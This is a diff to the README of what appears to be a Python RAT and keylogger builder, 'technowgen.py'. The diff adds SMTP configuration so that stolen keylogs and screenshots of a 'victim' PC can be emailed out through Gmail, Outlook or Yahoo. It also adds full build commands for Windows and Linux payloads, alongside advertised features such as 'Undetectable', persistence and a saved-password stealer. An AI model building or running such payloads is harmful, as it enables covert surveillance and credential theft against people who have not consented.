@@ -52,6 +52,17 @@ THIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS
 - [x] Notify New Victim Via Email
 - [x] Undetectable
 - [x] Persistence
+- [x] Can receive Keylogs in any email provider such as GMAIL, YAHOO, OUTLOOK, Custom SMTP.
+- [x] Compatible with Gmail, Yahoo, Outlook and custom SMTP servers.
+
+* SMTP Server/ Port
+
+| Server Name | SMTP Server | SMTP Port |
+| ----------- | ----------- | --------- |
+| GMAIL       | smtp.gmail.com | 587 |
+| OUTLOOK     | smtp-mail.outlook.com | 587 |
+| YAHOO       | smtp.mail.yahoo.com | 587 |
+
 - [x] Sends Screenshot of Victim PC's Screen via email
 - [x] Creates Executable Binary With Zero Dependencies
 - [x] Create less size ~ 5mb payload with advance functionality
@@ -135,6 +146,15 @@ $ python3 technowgen.py --help
 # Making Payload/RAT
 $ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
 
+# Making Payload using GMAIL SMTP Server, Port Configuration (Default SMTP Server = smtp.gmail.com, Default SMTP Port = 587)
+$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -l -o output_file_name --icon icon_path
+
+# Making Payload using OUTLOOK SMTP Server, Port Configuration
+$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -x smtp-mail.outlook.com -y 587 -l -o output_file_name --icon icon_path
+
+# Making Payload using YAHOO SMTP Server, Port Configuration
+$ python3 technowgen.py -e youremail@gmail.com -p YourEmailPass -x smtp.mail.yahoo.com -y 587 -l -o output_file_name --icon icon_path
+
 Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
 
@@ -160,6 +180,15 @@ $ python technowgen.py --help
 # Making Payload/RAT
 $ python technowgen.py -e youremail@gmail.com -p YourEmailPass -w -o output_file_name --icon icon_path
 
+# Making Payload using GMAIL SMTP Server, Port Configuration (Default SMTP Server = smtp.gmail.com, Default SMTP Port = 587)
+$ python technowgen.py -e youremail@gmail.com -p YourEmailPass-w -o output_file_name --icon icon_path
+
+# Making Payload using OUTLOOK SMTP Server, Port Configuration
+$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -x smtp-mail.outlook.com -y 587 -w -o output_file_name --icon icon_path
+
+# Making Payload using YAHOO SMTP Server, Port Configuration
+$ python technowgen.py -e youremail@gmail.com -p YourEmailPass -x smtp.mail.yahoo.com -y 587 -w -o output_file_name --icon icon_path
+
 Note: You can also use our custom icons from the icon folder, just use them like this  --icon icon/pdf.ico
 ```
 
@@ -178,6 +207,8 @@ Note: You can also use our custom icons from the icon folder, just use them like
 | -h          | --help    | show this help message and exit |
 | -i INTERVAL | --interval INTERVAL | Time between reports in seconds. default=120|
 | -t TIME_PERSISTENT | --persistence TIME_PERSISTENT | Becoming Persistence After __ seconds. default=10 |
+| -x SMTP_Server | --smtp | Custom SMTP Server . default="smtp.gmail.com" |
+| -y SMTP_Port | --port | Custom SMTP Port . default=587 |
 |  -w | --windows | Generate a Windows executable. |
 |  -l | --linux   | Generate a Linux executable. |
 |  -s | --steal-password | Steal Saved Password from Victim Machine [**Supported OS : Windows**] |
@@ -193,6 +224,7 @@ Note: You can also use our custom icons from the icon folder, just use them like
 | -e EMAIL    | --email EMAIL | Email address to send reports to. |
 | -p PASSWORD | --password PASSWORD | Password for the email address given in the -e argument. |
 | -o OUT      | --out OUT    | Output file name.|
+
 
 ## New Screenshots:
 
